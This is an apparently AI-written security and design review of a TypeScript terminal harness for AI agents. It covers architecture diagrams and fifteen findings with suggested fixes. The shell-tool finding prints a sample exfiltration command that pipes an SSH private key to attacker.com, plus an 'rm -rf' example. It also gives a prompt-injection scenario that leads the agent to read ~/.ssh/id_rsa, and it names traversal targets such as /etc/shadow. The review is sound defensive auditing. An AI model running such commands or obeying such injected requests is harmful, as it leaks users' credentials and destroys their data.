# agentfactory-harness — Security & Design Review
<!-- version: 1.0.0 -->

**Date**: 2026-04-27
**Scope**: Waves 0–2 (all 27 implemented source files)
**Reviewer**: Claude Sonnet 4.6
**Tests audited**: 8 files · 46 tests · all passing

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Full System Architecture](#full-system-architecture)
3. [Data Flow Workflows](#data-flow-workflows)
4. [Security Findings](#security-findings)
5. [Design Gaps & Open Ends](#design-gaps--open-ends)
6. [Component Status Matrix](#component-status-matrix)
7. [Test Coverage Report](#test-coverage-report)
8. [Recommendations](#recommendations)

---

## Executive Summary

**agentfactory-harness** is a TypeScript full-screen TUI for AI agent orchestration. It implements a custom ANSI cell-buffer renderer, xterm SGR mouse input, a streaming Claude agent loop, and a drag-and-drop ITUI orchestration canvas. Waves 0–2 are fully implemented. Waves 3–5 (DAG orchestration, terminal embed, registry) are planned but not started.

| Area | Finding |
|------|---------|
| Architecture | Sound layering; canvas ↔ session ↔ agents integration entirely missing |
| Security | **3 Critical · 5 High · 4 Medium · 3 Low** |
| Test coverage | **~30%** file coverage (8 / 27 files) — Rule 7 (80%) not met |
| Type safety | Strict TypeScript + Zod validation in place — good foundation |
| Open ends | 11 planned modules not started (Waves 3–5); 5 slash commands not wired |

**Highest-risk items requiring immediate action:**
1. Bash tool executes unrestricted shell commands (critical path injection risk)
2. Read/Write tools accept any filesystem path (traversal to `/etc/passwd`, `~/.ssh/`)
3. Tool output rendered to terminal without ANSI escape sanitization
4. Hook context passed via environment variable (sensitive data exposure)

---

## Full System Architecture

### 1.1 Layer Map

```mermaid
flowchart TD
    subgraph ENTRY["Entry Layer"]
        IDX["index.ts\nBinary entry point"]
        CLI2["cli.ts\nCommander · doctor subcommand"]
        APP["app.ts\nMain loop · layout · render · input"]
    end

    subgraph RENDERER["TUI Renderer"]
        ANSI["ansi.ts\nANSI ESC sequence builders"]
        BUF["cell-buffer.ts\n2D Cell grid · diff algorithm"]
        THEME["theme.ts\nColor palette · box-drawing chars"]
        LAYOUT["layout.ts\nPanel geometry · border drawing"]
    end

    subgraph INPUT["TUI Input"]
        KBD["keyboard.ts\nKey parsing · special keys"]
        MSE["mouse.ts\nxterm SGR mouse parser"]
        RTR["router.ts\nEvent dispatch to panels"]
    end

    subgraph PANELS["TUI Panels"]
        SP["SessionPanel\nChat · streaming · slash commands"]
        OC["OrchestrationCanvas\nDrag-drop ITUI · blocks · wires"]
        AP["AgentsPanel\nAgent list · status badges"]
        SB["StatusBar\nVersion · mode · keybinds"]
    end

    subgraph WIDGETS["TUI Widgets"]
        BLK["Block.ts\nAgent node rendering"]
        WIR["Wire.ts\nL-shaped wire routing"]
        CTX["ContextMenu.ts\nRight-click popup"]
    end

    subgraph CORE["Core Agent Loop"]
        SES["session.ts\nConversation history"]
        AL["agent-loop.ts\nClaude streaming · tool dispatch"]
        HKS["hooks.ts\nShell script lifecycle hooks"]
        TRG["tools/index.ts\nRegistry · Zod dispatch"]
        BASH["bash.ts\nexec() shell"]
        READ["read.ts\nfs.readFile"]
        WRITE["write.ts\nfs.writeFile"]
        FETCH["web-fetch.ts\nfetch() HTTP"]
    end

    subgraph HARNESS["Harness"]
        DOC["doctor.ts\n5 environment health checks"]
    end

    subgraph PLANNED["Planned — Waves 3–5"]
        SCHEMA["schema.ts W3\naf-plan.json Zod schema"]
        EXEC["executor.ts W3\nDAG runner"]
        GRAPH["graph.ts W3\nTopo sort · cycle detection"]
        PLN["planner.ts W3\nPlan wizard UI"]
        TERM["TerminalPanel W4\nnode-pty embed"]
        PAL["CommandPalette W1\nCtrl+P fuzzy search"]
        READER["harness/reader.ts W5\n.ai/ loader"]
        RCLI["registry/client.ts W5\nREST client"]
        RAUTH["registry/auth.ts W5\nToken auth"]
    end

    subgraph EXTERNAL["External"]
        SDK["@anthropic-ai/sdk\nClaude API"]
        ZOD["zod\nSchema validation"]
        CMD["commander\nCLI arg parsing"]
        PTY["node-pty\nPseudo-terminal"]
    end

    IDX --> APP
    IDX --> CLI2
    APP --> RENDERER
    APP --> INPUT
    APP --> PANELS
    PANELS --> CORE
    PANELS --> WIDGETS
    OC --> BLK
    OC --> WIR
    OC --> CTX
    AL --> SDK
    AL --> SES
    AL --> TRG
    AL --> HKS
    TRG --> BASH
    TRG --> READ
    TRG --> WRITE
    TRG --> FETCH
    TRG --> ZOD
    CLI2 --> CMD
    CLI2 --> DOC
    TERM -.-> PTY

    style PLANNED fill:#f5f5f5,stroke:#aaa,stroke-dasharray:5
    style SCHEMA fill:#ffe0b2,stroke:#aaa
    style EXEC fill:#ffe0b2,stroke:#aaa
    style GRAPH fill:#ffe0b2,stroke:#aaa
    style PLN fill:#ffe0b2,stroke:#aaa
    style TERM fill:#ffe0b2,stroke:#aaa
    style PAL fill:#ffe0b2,stroke:#aaa
    style READER fill:#ffe0b2,stroke:#aaa
    style RCLI fill:#ffe0b2,stroke:#aaa
    style RAUTH fill:#ffe0b2,stroke:#aaa
```

---

### 1.2 Module Dependency Graph

```mermaid
flowchart LR
    subgraph NODEPS["No external dependencies"]
        A1["ansi.ts"]
        T1["theme.ts"]
        K1["keyboard.ts"]
        M1["mouse.ts"]
        W1["Wire.ts"]
    end

    BUF2["cell-buffer.ts"] --> A1
    LAY["layout.ts"] --> BUF2
    LAY --> T1

    SES2["session.ts"] --> SDK2["@anthropic-ai/sdk (types)"]

    TI["tools/index.ts"] --> ZOD2["zod"]
    B2["bash.ts"] --> TI
    R2["read.ts"] --> TI
    WR["write.ts"] --> TI
    WF["web-fetch.ts"] --> TI

    HK["hooks.ts"] --> FS["fs · child_process"]

    AL2["agent-loop.ts"] --> SES2
    AL2 --> TI
    AL2 --> HK
    AL2 --> SDK2

    RT["router.ts"] --> K1
    RT --> M1

    BK["Block.ts"] --> BUF2
    BK --> T1
    CM["ContextMenu.ts"] --> BUF2
    CM --> K1
    CM --> T1

    SP2["SessionPanel.ts"] --> SES2
    SP2 --> AL2
    SP2 --> HK
    SP2 --> BUF2

    OC2["OrchestrationCanvas.ts"] --> BUF2
    OC2 --> M1
    OC2 --> BK
    OC2 --> W1
    OC2 --> CM

    AP2["AgentsPanel.ts"] --> BUF2

    APP2["app.ts"] --> SP2
    APP2 --> OC2
    APP2 --> AP2
    APP2 --> RT
    APP2 --> LAY
    APP2 --> TI
    APP2 --> B2
    APP2 --> R2
    APP2 --> WR
    APP2 --> WF
```

---

## Data Flow Workflows

### 2.1 User Message → Claude Response (Full Sequence)

```mermaid
sequenceDiagram
    actor User
    participant SP as SessionPanel
    participant SES as Session
    participant AL as agentLoop()
    participant SDK as Anthropic SDK
    participant TI as Tool Registry
    participant HK as Hook Runner
    participant SH as Shell

    User->>SP: Type message + press Enter
    SP->>SES: addMessage(role:user, content)
    SP->>HK: runHook('SessionStart', {})
    HK->>SH: .ai/hooks/SessionStart.sh (if exists)
    SH-->>HK: exit code
    HK-->>SP: { continue: true }

    loop Each turn up to maxTurns=20
        AL->>HK: runHook('StepStart', {turn})
        HK-->>AL: { continue: true }

        AL->>SDK: messages.stream({ model, system, messages, tools, stream:true })

        loop Streaming events
            SDK-->>AL: content_block_delta type:text
            AL-->>SP: yield { type:'text_delta', delta }
            SP->>SP: append ChatLine, call onUpdate()
        end

        SDK-->>AL: content_block_start type:tool_use
        AL-->>SP: yield { type:'tool_start', name, id }

        loop Per tool use block
            AL->>HK: runHook('PreToolUse', { tool, input })
            HK->>SH: .ai/hooks/PreToolUse.sh (if exists)
            SH-->>HK: exit 0 = allow, exit 1 = block
            HK-->>AL: { continue: true | false }

            alt continue = true
                AL->>TI: dispatch(toolName, rawInputJSON)
                TI->>TI: safeParse(zod schema)
                TI->>TI: tool.run(parsedInput)
                TI-->>AL: result string
                AL->>HK: runHook('PostToolUse', { tool, result })
                AL->>SES: addMessage(tool_result)
                AL-->>SP: yield { type:'tool_result', id, content }
            else continue = false
                AL-->>SP: yield { type:'error', error }
            end
        end

        AL->>SES: addMessage(assistant turn)
        AL->>HK: runHook('StepComplete', { turn, stop_reason })
        AL-->>SP: yield { type:'turn_end', stop_reason }

        alt stop_reason is end_turn OR no tools used
            AL->>AL: break
        end
    end

    AL->>HK: runHook('SessionStop', {})
    SP->>SP: Final render pass
    SP-->>User: Complete conversation displayed
```

---

### 2.2 Tool Dispatch Detail

```mermaid
flowchart TD
    START(["dispatch(name, rawInput)\ncalled from agent-loop"])

    FIND{"getTool(name)\nRegistry lookup"}
    NOTFOUND["return 'unknown tool: name'"]

    ZOD{"tool.inputSchema\n.safeParse(rawInput)"}
    ZODOK["parsed.data → call tool.run()"]
    ZODERR["return 'invalid input: zod error'"]

    RUN["tool.run(parsedInput)\nawait result"]
    STR{"typeof result\n=== string?"}
    JSON["JSON.stringify(result)"]
    OK(["return result string\nto agent-loop"])
    ERR["return 'Error: ...'"]
    CATCH{"throws?"}

    START --> FIND
    FIND -->|"undefined"| NOTFOUND --> OK
    FIND -->|"found"| ZOD
    ZOD -->|"failure"| ZODERR --> OK
    ZOD -->|"success"| ZODOK --> RUN
    RUN --> CATCH
    CATCH -->|"yes"| ERR --> OK
    CATCH -->|"no"| STR
    STR -->|"yes"| OK
    STR -->|"no"| JSON --> OK
```

---

### 2.3 Hook Execution Flow

```mermaid
sequenceDiagram
    participant CALLER as agentLoop / SessionPanel
    participant HK as hooks.ts
    participant FS as fs.existsSync
    participant EXEC as child_process.execFile
    participant SHELL as .sh script

    CALLER->>HK: runHook(event, ctx, cwd)
    HK->>HK: hookPath = `${cwd}/.ai/hooks/${event}.sh`
    HK->>FS: existsSync(hookPath)

    alt File does not exist
        FS-->>HK: false
        HK-->>CALLER: { continue: true }
    else File exists
        FS-->>HK: true
        HK->>EXEC: execFile(hookPath, { env: { ...process.env, HOOK_CTX: JSON.stringify(ctx) } })

        alt Exit code 0
            EXEC-->>HK: stdout (ignored currently)
            HK-->>CALLER: { continue: true }
        else Exit code != 0 AND event = PreToolUse
            EXEC-->>HK: stderr
            HK-->>CALLER: { continue: false }  ← blocks tool execution
        else Exit code != 0 AND other events
            EXEC-->>HK: stderr
            HK-->>CALLER: { continue: true }   ← non-blocking failure
        end
    end
```

---

### 2.4 TUI Render Pipeline

```mermaid
flowchart LR
    subgraph LOOP["App render() — called on any change"]
        L1["computeLayout(rows, cols)\n→ PanelLayout"]
        L2["drawBorder(buf, rect, title, focused)\nfor each panel"]
        L3["panel.render(buf)\nSessionPanel, Canvas, Agents, StatusBar"]
        L4["buf.diff(prev)\n→ ANSI string (only changed cells)"]
        L5["process.stdout.write(ansi)"]
        L6["prev = buf.clone()"]
    end

    L1 --> L2 --> L3 --> L4 --> L5 --> L6
    L6 -->|"next change event"| L1

    subgraph BUF_OPS["CellBuffer internals"]
        BO1["write(row, col, text, style)\n→ set cells[row][col]"]
        BO2["fill(row, col, h, w, char, style)\n→ rectangular region"]
        BO3["diff(prev)\n→ iterate all cells O(rows×cols)\n→ skip unchanged\n→ emit moveTo + sgr + char"]
    end

    subgraph ANSI_OUT["ANSI output tokens"]
        AO1["moveTo(row, col)\nESC[row;colH"]
        AO2["sgr(bold, fg256, bg256)\nESC[...m"]
        AO3["cell.char\nUTF-8 character"]
    end

    BUF_OPS --> ANSI_OUT
```

---

### 2.5 Input Routing

```mermaid
flowchart TD
    STDIN["stdin raw bytes\nprocess.stdin on 'data'"]
    DETECT{"Starts with\nESC [ < ?"}

    KMATCH["parseKey(data)\n→ KeyEvent | null"]
    MMATCH["parseMouse(data)\nSGR: ESC[<flags;col;rowM/m\n→ MouseEvent | null"]

    RTR["InputRouter.dispatch\n(event, panels, focusedIdx)"]

    KBRANCH{"KeyEvent?"}
    MBRANCH{"MouseEvent?"}

    FOCUSED["panels[focusedIdx]\n.onKey(event)"]
    HIT["find panel where\nrect contains (row,col)\n.onMouse(event)"]

    subgraph SP_KEYS["SessionPanel.onKey()"]
        SK1["Printable char → append inputBuf"]
        SK2["Backspace → delete last char"]
        SK3["Enter → submit() → agentLoop"]
        SK4["Arrow Up/Down → scroll history"]
        SK5["/ prefix → slash command"]
    end

    subgraph OC_MOUSE["OrchestrationCanvas.onMouse()"]
        OM1["Left press on block header → start drag"]
        OM2["Mouse move while dragging → update ghost position"]
        OM3["Left release → snap block to grid"]
        OM4["Right press → open ContextMenu"]
        OM5["Left press on empty → close menu"]
    end

    STDIN --> DETECT
    DETECT -->|"yes"| MMATCH
    DETECT -->|"no"| KMATCH
    KMATCH --> RTR
    MMATCH --> RTR
    RTR --> KBRANCH
    RTR --> MBRANCH
    KBRANCH -->|"yes"| FOCUSED
    MBRANCH -->|"yes"| HIT
    FOCUSED --> SP_KEYS
    HIT --> OC_MOUSE
```

---

### 2.6 OrchestrationCanvas State Machine

```mermaid
stateDiagram-v2
    [*] --> Idle : app.start()

    Idle --> Dragging : Left press on block header\nrecord dragBlockId\noffsetRow = press.row - block.row\noffsetCol = press.col - block.col

    Idle --> MenuOpen : Right press on block\nbuild MenuItems\nset menuPos

    Idle --> Idle : Left press on empty area\nscroll events

    Dragging --> Dragging : Mouse move\nghostRow = event.row - offsetRow\nghostCol = event.col - offsetCol

    Dragging --> Idle : Left button release\nsnap: block.row = round(ghost/GRID_ROWS)*GRID_ROWS\nblock.col = round(ghost/GRID_COLS)*GRID_COLS\nclear dragState

    MenuOpen --> Idle : Escape key\nor left click outside menu

    MenuOpen --> Idle : Enter key on item\nexecute item.action()\n(Open Session / Delete Block / Add Block)

    MenuOpen --> MenuOpen : Arrow Up key\nselectedIdx = max(0, idx-1)

    MenuOpen --> MenuOpen : Arrow Down key\nselectedIdx = min(items.len-1, idx+1)

    note right of Dragging
        Block rendered faded (opacity effect via dim SGR)
        Ghost rendered at cursor-offset position
        All wire endpoints recalculated live from block positions
    end note

    note right of MenuOpen
        Normal items: text color
        danger=true items: red color
        Selected item: accent background highlight
    end note
```

---

### 2.7 Agent Loop Turn Logic

```mermaid
flowchart TD
    START(["agentLoop(session, opts)\nturn = 0"])

    CHECK{"turn < maxTurns\nAND !signal.aborted?"}
    ABORT(["yield error\nreturn"])
    HOOKSS["runHook('StepStart', {turn})"]
    STREAM["sdk.messages.stream({\n  model, system,\n  messages: session.getHistory(),\n  tools: listTools(),\n  stream: true\n})"]

    EVTLOOP{"for-await\nstream event"}
    TEXT["accumulate textAccum\nyield text_delta"]
    TOOL_S["record in toolBlocks Map\nyield tool_start"]
    TOOL_D["accumulate inputAccum\nfor this tool block"]
    MSG_D["update stop_reason"]
    DONE["add assistant message\nto session"]

    TOOLLOOP{"for each\ntoolBlock"}
    HOOKPRE["runHook('PreToolUse'\n{name, input})"]
    ALLOW{"continue?"}
    PARSE["JSON.parse(inputAccum)\n→ parsedInput"]
    DISPATCH["dispatch(name, parsedInput)\n→ result string"]
    HOOKPOST["runHook('PostToolUse'\n{name, result})"]
    ADDRES["session.addMessage\n(tool_result)"]
    YIELDRES["yield tool_result"]
    HOOKSC["runHook('StepComplete'\n{turn, stop_reason})"]
    YIELDEND["yield turn_end"]

    BREAK{"stop_reason\n= 'end_turn'\nOR no tools?"}
    NEXT["turn++"]
    END(["runHook('SessionStop')\nreturn"])

    START --> CHECK
    CHECK -->|"no"| ABORT
    CHECK -->|"yes"| HOOKSS --> STREAM --> EVTLOOP
    EVTLOOP -->|"text_delta"| TEXT --> EVTLOOP
    EVTLOOP -->|"tool_use start"| TOOL_S --> EVTLOOP
    EVTLOOP -->|"input_json_delta"| TOOL_D --> EVTLOOP
    EVTLOOP -->|"message_delta"| MSG_D --> EVTLOOP
    EVTLOOP -->|"stream end"| DONE --> TOOLLOOP
    TOOLLOOP --> HOOKPRE --> ALLOW
    ALLOW -->|"yes"| PARSE --> DISPATCH --> HOOKPOST --> ADDRES --> YIELDRES --> TOOLLOOP
    ALLOW -->|"no"| TOOLLOOP
    TOOLLOOP -->|"all done"| HOOKSC --> YIELDEND --> BREAK
    BREAK -->|"yes"| END
    BREAK -->|"no"| NEXT --> CHECK
```

---

## Security Findings

### Finding Matrix

| ID | Severity | File | Description |
|----|----------|------|-------------|
| S1 | 🔴 Critical | `tools/bash.ts:30` | Unrestricted shell command execution |
| S2 | 🔴 Critical | `tools/read.ts:25` `tools/write.ts:28` | No path validation — full filesystem access |
| S3 | 🔴 Critical | `hooks.ts:24` | Hook path constructed without traversal check |
| S4 | 🟠 High | `hooks.ts:29` | Sensitive context in `HOOK_CTX` environment variable |
| S5 | 🟠 High | `SessionPanel.ts:149` | ANSI escape injection in tool output display |
| S6 | 🟠 High | `agent-loop.ts:118` | Silent `JSON.parse` failure — empty tool input |
| S7 | 🟠 High | `agent-loop.ts:46` | No API error redaction — SDK errors may leak metadata |
| S8 | 🟠 High | `session.ts:4` | Unbounded conversation history — memory exhaustion |
| S9 | 🟡 Medium | `cell-buffer.ts:67` | Non-null assertions (`!`) bypass strict null checks |
| S10 | 🟡 Medium | `mouse.ts:28` | No integer bounds check on SGR parsed values |
| S11 | 🟡 Medium | `tools/index.ts` | No schema strictness enforcement at registry level |
| S12 | 🟡 Medium | `ContextMenu.ts:64` | Destructive actions (delete) without confirmation |
| S13 | 🔵 Low | `session.ts:14` | Token count = `JSON.length / 4` — inaccurate |
| S14 | 🔵 Low | `agent-loop.ts:11` | Hard-coded model name, no env var override |
| S15 | 🔵 Low | `bash.ts:30` | No rate limiting on tool call frequency |

---

### S1 — Critical: Unrestricted Shell Execution

**File**: `src/core/tools/bash.ts:30`
**CVSS-like**: High impact, medium exploitability (requires prompt injection or malicious plan)

```typescript
// Current — spawns /bin/sh -c command
const { stdout, stderr } = await execAsync(command, { timeout })
```

`exec()` invokes a shell interpreter, enabling full shell expansion: `&&`, `||`, `;`, `$(...)`, `>`, pipe chaining. A successful prompt injection could execute `rm -rf $HOME`, exfiltrate `cat ~/.ssh/id_rsa | curl attacker.com`, or install malware.

**Attack vector**:
```
User message: "Summarize the file and also run: cat ~/.ssh/id_rsa"
Claude constructs BashTool call: { command: "cat ~/.ssh/id_rsa" }
→ tool executes without restriction
```

**Recommended fix**:
```typescript
import { execFile } from 'child_process'
import { promisify } from 'util'
const execFileAsync = promisify(execFile)

// Option A: execFile (no shell, no expansion)
const [cmd, ...args] = command.split(/\s+/)
const { stdout, stderr } = await execFileAsync(cmd!, args, { timeout })

// Option B: command allowlist
const SAFE_CMDS = new Set(['git', 'npm', 'npx', 'ls', 'cat', 'grep', 'find', 'echo'])
const base = command.trim().split(/\s+/)[0] ?? ''
if (!SAFE_CMDS.has(base)) throw new Error(`command not in allowlist: ${base}`)
```

---

### S2 — Critical: Path Traversal in Read/Write Tools

**Files**: `src/core/tools/read.ts:25`, `src/core/tools/write.ts:28-29`
**Risk**: Read any file on the host; write to system paths

```typescript
// read.ts — no boundary check
return await readFile(file_path, 'utf8')

// write.ts — creates directories anywhere, writes anywhere
await mkdir(dirname(file_path), { recursive: true })
await writeFile(file_path, content, 'utf8')
```

**Attack scenarios**:
- Claude reads `file_path: "/etc/shadow"` or `"../../../.ssh/id_rsa"`
- Claude writes a cron job to `/etc/cron.d/backdoor` or overwrites `~/.bashrc`

**Required fix** — add to both tools:
```typescript
import path from 'path'

function assertSafePath(filePath: string): void {
  const root = process.cwd()
  const resolved = path.resolve(root, filePath)
  if (!resolved.startsWith(root + path.sep) && resolved !== root) {
    throw new Error(`path outside project root: ${filePath}`)
  }
}
```

---

### S3 — Critical: Hook Path Not Normalized

**File**: `src/core/hooks.ts:24`
**Risk**: Execute `.sh` files outside `.ai/hooks/`

```typescript
const hookPath = `${cwd}/.ai/hooks/${event}.sh`
// No normalization — if cwd contains ../ or event contains ../ this escapes
```

While `event` comes from a TypeScript enum (safe today), `cwd` is passed by callers. If `cwd` ever contains a relative segment, or if `event` handling is extended to user input, path traversal becomes possible.

**Fix**:
```typescript
import path from 'path'

function buildHookPath(cwd: string, event: HookEvent): string {
  const hookDir = path.resolve(cwd, '.ai', 'hooks')
  const hookPath = path.join(hookDir, `${event}.sh`)
  // Prevent traversal even if event somehow contains ../
  if (!hookPath.startsWith(hookDir + path.sep)) {
    throw new Error(`invalid hook path computed for event: ${event}`)
  }
  return hookPath
}
```

---

### S4 — High: Sensitive Data in HOOK_CTX Environment Variable

**File**: `src/core/hooks.ts:29`
**Risk**: Conversation content, tool results, API-adjacent data exposed via process environment

```typescript
env: { ...process.env, HOOK_CTX: JSON.stringify(ctx) }
```

Environment variables are visible in `/proc/<pid>/environ` on Linux, appear in crash dumps, and may be captured by system monitoring tools. The context passed to `PostToolUse` includes tool results which could contain secrets read by the `ReadTool`.

**Fix** — deliver context via stdin pipe:
```typescript
const proc = spawn(hookPath, [], {
  stdio: ['pipe', 'pipe', 'pipe'],
  env: process.env  // no HOOK_CTX in env
})
proc.stdin.write(JSON.stringify(ctx))
proc.stdin.end()
```

Hook scripts read context with:
```bash
HOOK_CTX=$(cat)
echo "$HOOK_CTX" | jq '.tool'
```

---

### S5 — High: ANSI Escape Injection in Tool Output

**File**: `src/tui/panels/SessionPanel.ts:149`
**Risk**: Terminal control character injection — visual corruption, cursor hijack, data exfiltration via OSC sequences

```typescript
const preview = event.content.substring(0, 80).replace(/\n/g, ' ')
// preview rendered directly to CellBuffer → stdout, no ANSI stripping
```

If `ReadTool` reads a file containing `\x1b[1;31m` (red bold) or `\x1b]0;TITLE\x07` (terminal title manipulation) or `\x1b[?1049h` (switch to alt screen), those sequences pass through to the terminal.

**Fix** — add to SessionPanel and any raw string rendering:
```typescript
function sanitizeForDisplay(str: string): string {
  return str
    .replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '')   // CSI sequences
    .replace(/\x1b\][^\x07]*\x07/g, '')        // OSC sequences
    .replace(/[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f]/g, '')  // control chars
}

const preview = sanitizeForDisplay(event.content).substring(0, 80).replace(/\n/g, ' ')
```

---

### S6 — High: Silent JSON Parse Failure

**File**: `src/core/agent-loop.ts:118`
**Risk**: Tool dispatched with empty `{}` input when API sends malformed JSON delta

```typescript
try {
  if (block.inputAccum) parsedInput = JSON.parse(block.inputAccum)
} catch {
  parsedInput = {}  // silent — tool runs with no input
}
```

If the Claude API streams a partial `input_json_delta` that results in invalid JSON (truncation, encoding issue), the tool is invoked with an empty object. Zod will catch it, but the original error is swallowed with no visibility.

**Fix**:
```typescript
try {
  if (block.inputAccum) parsedInput = JSON.parse(block.inputAccum)
} catch (e) {
  yield { type: 'error', error: new Error(`malformed tool input for '${block.name}': ${String(e)}`) }
  continue  // skip this tool block
}
```

---

### S7 — High: No API Error Redaction

**File**: `src/core/agent-loop.ts:46`
**Risk**: SDK error strings may contain serialized request headers or auth metadata

```typescript
const client = new Anthropic()  // reads ANTHROPIC_API_KEY from env
// No error handler configured, errors propagate as-is
```

Anthropic SDK errors include HTTP status codes, request IDs, and sometimes request body summaries. If these are rendered to the chat panel, they may expose information about the conversation structure.

**Fix**:
```typescript
function redactApiError(e: unknown): Error {
  const msg = e instanceof Error ? e.message : String(e)
  return new Error(
    msg
      .replace(/sk-ant-[a-zA-Z0-9\-_]+/g, '[API_KEY_REDACTED]')
      .replace(/"content":\s*\[.{0,200}/g, '"content": [REDACTED]')
  )
}
// In agent-loop catch block:
yield { type: 'error', error: redactApiError(e) }
```

---

### S8 — High: Unbounded Session History

**File**: `src/core/session.ts:4`
**Risk**: Memory exhaustion on long sessions; sensitive conversation data retained indefinitely in process memory

```typescript
private history: MessageParam[] = []
// No eviction, no size cap, no expiry
```

A 6-hour session with tool results could accumulate hundreds of MB in the history array. More importantly, if `session.clear()` is never called, all conversation content (including potentially sensitive tool outputs) stays in memory for the process lifetime.

**Fix** — sliding window with configurable cap:
```typescript
private readonly maxMessages: number

constructor(maxMessages = 200) {
  this.maxMessages = maxMessages
}

addMessage(msg: MessageParam): void {
  this.history.push(msg)
  if (this.history.length > this.maxMessages) {
    // Preserve system context — evict oldest non-system messages
    this.history = this.history.slice(this.history.length - this.maxMessages)
  }
}
```

---

### S9–S15 — Medium / Low

| ID | Location | Issue | Quick Fix |
|----|----------|-------|-----------|
| S9 | `cell-buffer.ts:67` | `cells[r]![c]!` — non-null assertions | Add explicit bounds check before access |
| S10 | `mouse.ts:28` | `parseInt()` with no overflow cap | `if (col > 9999 \|\| row > 9999) return null` |
| S11 | `tools/index.ts` | No schema strictness enforcement | Reject tools registered with `z.any()` or `z.unknown()` at registration time |
| S12 | `ContextMenu.ts:64` | Delete block executes immediately | Two-step: first click shows "Confirm delete?" second confirms |
| S13 | `session.ts:14` | `JSON.length / 4` token estimate | Use Anthropic count_tokens API endpoint |
| S14 | `agent-loop.ts:11` | `'claude-opus-4-7'` hard-coded | `process.env.FACTORY_MODEL ?? 'claude-opus-4-7'` |
| S15 | `bash.ts:30` | No call rate limit | Track calls per minute; reject if over threshold |

---

### Security Attack Surface Map

```mermaid
flowchart TD
    subgraph EXTERNAL_INPUT["External Input Sources"]
        USER_MSG["User typed message"]
        PLAN_JSON["af-plan.json (Wave 3)"]
        HOOK_SH[".ai/hooks/*.sh"]
        TOOL_RESULT["Tool execution output"]
        API_RESP["Claude API response"]
    end

    subgraph ATTACK_SURFACE["Attack Vectors"]
        PI["Prompt Injection\nUser → Claude → dangerous tool call"]
        PT["Path Traversal\nfile_path: /etc/passwd"]
        CI["Command Injection\nbash: rm -rf ~"]
        ANSI["ANSI Escape Injection\ntool result → terminal"]
        ENV["Env Var Leak\nHOOK_CTX sensitive data"]
        MEM["Memory Exhaustion\nunbounded session history"]
    end

    USER_MSG -->|"→ agentLoop"| PI
    API_RESP --> CI
    API_RESP --> PT
    TOOL_RESULT --> ANSI
    TOOL_RESULT --> ENV
    USER_MSG --> MEM

    PI -->|"exploits"| CI
    PI -->|"exploits"| PT
    CI -->|"via"| BASH["BashTool.run()\n🔴 Critical"]
    PT -->|"via"| RT["ReadTool / WriteTool\n🔴 Critical"]
    ANSI -->|"via"| SESP["SessionPanel\n.render()\n🟠 High"]
    ENV -->|"via"| HKS2["hooks.ts\nHOOK_CTX env\n🟠 High"]
    MEM -->|"via"| SESS["session.history[]\n🟠 High"]
```

---

## Design Gaps & Open Ends

### Gap 1: Canvas ↔ Session ↔ Agents — No Integration

The three main panels are completely independent. There is no shared state, no event bus, and no callbacks between them.

```mermaid
flowchart LR
    subgraph CURRENT["Current (isolated panels)"]
        direction TB
        OC3["OrchestrationCanvas\nBlocks · Wires · Drag"]
        SP3["SessionPanel\nChat · Agent loop"]
        AP3["AgentsPanel\n'session-0' hardcoded"]

        OC3 -. "no link" .-> SP3
        SP3 -. "no link" .-> AP3
        OC3 -. "no link" .-> AP3
    end

    subgraph NEEDED["Required integration (not yet built)"]
        direction TB
        BUS["AppState / EventBus\nShared observable store"]
        OC4["Canvas\nloadFromPlan(plan)\ngetState() → af-plan.json"]
        SP4["Session\nonAgentStatus(blockId, status)\nspawnForBlock(blockId)"]
        AP4["AgentsPanel\nupdateFromState(agents)"]
        EXEC4["executor.ts W3\nDAG runner"]

        BUS --> OC4
        BUS --> SP4
        BUS --> AP4
        EXEC4 --> BUS
    end

    CURRENT -.->|"missing"| NEEDED
```

**Missing glue code**:
- `Canvas.loadFromPlan(plan: Plan)` — populate blocks and wires from `af-plan.json`
- `Canvas.serialize()` → `Plan` — save canvas to plan format
- `AgentLoop.onStatusChange(blockId, status)` — update block status badges
- `App.spawnSessionForBlock(blockId)` — open session panel for a canvas node
- Shared `AppState` observable that all panels subscribe to

---

### Gap 2: No Data Persistence

```mermaid
flowchart LR
    RAM[("Process memory\n(lost on exit)")]

    CANVAS_MEM["Canvas state\nBlocks + Wires"]
    SESS_MEM["Session history\nAll messages"]
    AGENT_MEM["Agent list\n(hardcoded)"]

    RAM --> CANVAS_MEM
    RAM --> SESS_MEM
    RAM --> AGENT_MEM

    CANVAS_MEM -. "not saved" .-> FS_C[("af-plan.json")]
    SESS_MEM -. "not saved" .-> FS_S[("~/.agentfactory/sessions/")]
    AGENT_MEM -. "not saved" .-> FS_A[("manifest.json")]

    style FS_C fill:#ddd,stroke:#aaa,stroke-dasharray:4
    style FS_S fill:#ddd,stroke:#aaa,stroke-dasharray:4
    style FS_A fill:#ddd,stroke:#aaa,stroke-dasharray:4
```

**Required**:
- `OrchestrationCanvas.serialize()` / `deserialize()` using Wave 3 `schema.ts`
- `Session.persist(path)` / `Session.load(path)` to `~/.agentfactory/sessions/<id>.json`
- `App.onExit()` save handler + `App.onStart()` restore handler

---

### Gap 3: Slash Commands Not Wired

```mermaid
flowchart LR
    subgraph IMPL_CMD["Implemented"]
        C1["/help\nlist commands"]
        C2["/clear\nreset session"]
        C3["/tokens\ntoken count"]
    end

    subgraph MISSING_CMD["Documented but not implemented"]
        C4["/run plan\nneeds Wave 3 executor"]
        C5["/spawn agent\nneeds AgentTool.ts W1"]
        C6["/plan new\nneeds Wave 3 planner"]
        C7["/import slug\nneeds Wave 5 registry"]
        C8["/publish name\nneeds Wave 5 registry"]
    end

    style MISSING_CMD fill:#fff3cd,stroke:#ffc107
```

---

### Gap 4: Hook System Limitations

```mermaid
flowchart TD
    HOOK_NOW["Current hook system"]
    LIMIT1["❌ Shell scripts only\nNo TypeScript/JS hooks"]
    LIMIT2["❌ Hook stdout ignored\nNo structured output from hooks"]
    LIMIT3["❌ No error reporting to UI\nHook failures are silent (non-PreToolUse)"]
    LIMIT4["❌ No hook timeout\nHanging hook blocks the agent turn"]
    LIMIT5["❌ HOOK_CTX in env var\nSecurity risk (S4)"]
    LIMIT6["❌ No PreToolUse block reason\nUI shows error but no explanation"]

    HOOK_NOW --> LIMIT1
    HOOK_NOW --> LIMIT2
    HOOK_NOW --> LIMIT3
    HOOK_NOW --> LIMIT4
    HOOK_NOW --> LIMIT5
    HOOK_NOW --> LIMIT6
```

---

### Gap 5: Wave 3–5 Open Ends Map

```mermaid
